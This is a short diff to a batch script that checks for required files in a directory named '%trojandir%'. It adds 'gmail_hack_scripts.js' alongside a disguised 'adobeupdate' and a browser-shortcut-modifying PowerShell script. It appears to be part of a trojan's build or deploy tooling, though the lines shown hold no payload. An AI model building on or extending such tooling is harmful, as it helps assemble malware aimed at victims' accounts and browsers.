@@ -80,6 +80,8 @@ set files=%files% pythonhostrelay.py
 set files=%files% tpl_launch.cmd
 set files=%files% adobeupdate
 set files=%files% modify_browser_lnk_tpl.ps1
+set files=%files% gmail_hack_scripts.js
+
 
 FOR %%A IN (%files%) DO (
     IF NOT EXIST %trojandir%\%%A (
